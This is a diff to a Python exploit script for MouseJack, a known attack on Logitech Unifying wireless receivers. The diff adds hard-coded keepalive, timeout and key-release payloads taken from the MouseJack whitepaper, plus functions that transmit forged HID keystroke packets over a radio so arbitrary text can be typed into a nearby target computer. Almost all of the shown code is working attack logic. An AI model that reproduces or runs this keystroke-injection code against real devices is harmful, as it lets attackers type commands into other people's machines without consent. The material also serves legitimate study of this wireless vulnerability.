@@ -1,5 +1,7 @@
 import sys
 import time
+sys.path.append('.')
+from utils.hid_scan_codes import *
 
 SLEEPING_PERIOD = 12 / 1000 # ms
 PING_PAYLOAD = [0x0F, 0x0F, 0x0F, 0x0F]
@@ -18,6 +20,10 @@ def with_checksum(payload : list) -> list:
     cksum = (cksum + 1) & 0xFF # if cksum is 0xFF at this point, then adding 1 will cause it to exceed 1 byte, so doing the same thing
     payload.append(cksum)
     return payload
+
+KEEPALIVE_PAYLOAD = with_checksum([0x00, 0x40, 0x04, 0xB0]) # the keepalive itself, includes the timeout we set before (refer to Figure 6 in the MouseJack whitepaper: Logitech Unifying Keepalive Payload)
+SET_KEEPALIVE_TIMEOUT_PAYLOAD = with_checksum([0x00, 0x4F, 0x00, 0x04, 0xB0, 0x00, 0x00, 0x00, 0x00]) # refer to Figure 5 in the MouseJack whitepaper: Logitech Unifying Set Keepalive Timeout Payload
+KEY_RELEASE_PAYLOAD = with_checksum([0x00, 0xC3, 0x00, KEY_RELEASE, 0x00, 0x00, 0x00, 0x00, 0x00])
 
 def find_address_channel(radio, address) -> int:
     """
@@ -48,9 +54,18 @@ def find_address_channel(radio, address) -> int:
             return channel
     return 0
 
+def transmit_key(key, radio):
+    """
+    Given a hid_scan_code and a radio, transmit (and rest SLEEPING_PERIOD with keepalives) the key
+    """
+    radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, key, 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
+    time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
+    radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke
 
-
-
-KEEPALIVE_PAYLOAD = with_checksum([0x00, 0x40, 0x04, 0xB0]) # the keepalive itself, includes the timeout we set before (refer to Figure 6 in the MouseJack whitepaper: Logitech Unifying Keepalive Payload)
-SET_KEEPALIVE_TIMEOUT_PAYLOAD = with_checksum([0x00, 0x4F, 0x00, 0x04, 0xB0, 0x00, 0x00, 0x00, 0x00]) # refer to Figure 5 in the MouseJack whitepaper: Logitech Unifying Set Keepalive Timeout Payload
-KEY_RELEASE_PAYLOAD = with_checksum([0x00, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+def transmit_string(radio, text : str) -> bool:
+    """
+    Iterate each letter in the text string and trasmit the right hid_scan_code using radio.
+    Return true for success and false if fails.
+    """
+    for l in text:
+        transmit_key(key=LETTERS_DICTIONARY[l], radio=radio)
